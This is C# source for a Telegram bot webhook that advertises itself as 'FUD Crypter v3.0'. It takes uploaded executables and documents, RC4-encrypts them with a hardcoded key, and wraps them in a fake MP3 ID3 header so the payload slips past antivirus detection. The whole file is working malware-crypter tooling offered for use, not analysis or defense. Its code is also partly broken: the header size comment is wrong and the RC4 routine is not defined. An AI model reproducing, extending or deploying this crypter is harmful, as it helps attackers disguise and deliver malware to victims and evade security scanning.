app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var body = await reader.ReadToEndAsync();
    
    using var document = JsonDocument.Parse(body);
    var update = document.RootElement;
    
    if (update.TryGetProperty("message", out var message)) {
        var client = clientFactory.CreateClient();
        
        // /start command
        if (message.TryGetProperty("text", out var text) && text.GetString() == "/start") {
            using var form = new MultipartFormDataContent();
            if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                form.Add(new StringContent(chatId.GetInt64().ToString()), "chat_id");
            }
            form.Add(new StringContent("🚀 **FUD Crypter v3.0**\n\n📤 Send: `.exe .pdf .json .xls .xlsx .xml`\n🎵 Get: **FUD MP3**\n🔑 **FUD2026KEY!**\n\n**RC4 Stego**"), "text");
            form.Add(new StringContent("markdown"), "parse_mode");
            await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
            return;
        }
        
        // Document processing
        if (message.TryGetProperty("document", out var document)) {
            if (document.TryGetProperty("file_id", out var fileId) && 
                document.TryGetProperty("file_name", out var fileName) &&
                (fileName.GetString()!.EndsWith(".exe") || 
                 fileName.GetString()!.EndsWith(".pdf") || 
                 fileName.GetString()!.EndsWith(".json") ||
                 fileName.GetString()!.EndsWith(".xls") || 
                 fileName.GetString()!.EndsWith(".xlsx") ||
                 fileName.GetString()!.EndsWith(".xml"))) {
                
                // Get file
                using var formData = new MultipartFormDataContent();
                formData.Add(new StringContent(fileId.GetString()!), "file_id");
                var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
                var fileJson = await fileResponse.Content.ReadAsStringAsync();
                using var fileDoc = JsonDocument.Parse(fileJson);
                var filePath = fileDoc.RootElement
                    .GetProperty("result").GetProperty("file_path").GetString()!;
                
                // Download file
                var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
                var fileBytes = await client.GetByteArrayAsync(fileUrl);
                
                if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatIdProp)) {
                    var chatId = chatIdProp.GetInt64();
                    
                    // RC4 Encrypt (FUD2026KEY!)
                    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
                    var encrypted = RC4(fileBytes, key);
                    
                    // Create MP3 with ID3v2.3 header + payload
                    var mp3Header = Encoding.UTF8.GetBytes("ID3\x03\x00\x00\x00\x00\x00\nFUD2026"); // 40 bytes
                    var fudMp3 = mp3Header.Concat(encrypted).ToArray();
                    
                    // Send MP3
                    using var mp3Content = new MultipartFormDataContent();
                    mp3Content.Add(new StringContent(chatId.ToString()), "chat_id");
                    var mp3Stream = new MemoryStream(fudMp3);
                    mp3Content.Add(new StreamContent(mp3Stream), "document", "fud.mp3");
                    mp3Content.Add(new StringContent("FUD MP3! Key: `FUD2026KEY!`"), "caption");
                    mp3Content.Add(new StringContent("markdown"), "parse_mode");
                    
                    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", mp3Content);
                }
            }
        }
    }
});
